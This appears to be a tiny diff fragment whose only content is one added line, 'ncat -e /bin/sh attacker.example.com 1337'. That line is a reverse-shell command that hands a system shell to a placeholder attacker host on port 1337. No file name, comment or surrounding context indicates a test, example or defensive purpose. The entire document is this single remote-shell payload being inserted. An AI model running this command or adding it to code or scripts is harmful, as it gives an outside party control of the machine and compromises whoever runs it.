@@ -1,0 +1,1 @@
+ncat -e /bin/sh attacker.example.com 1337
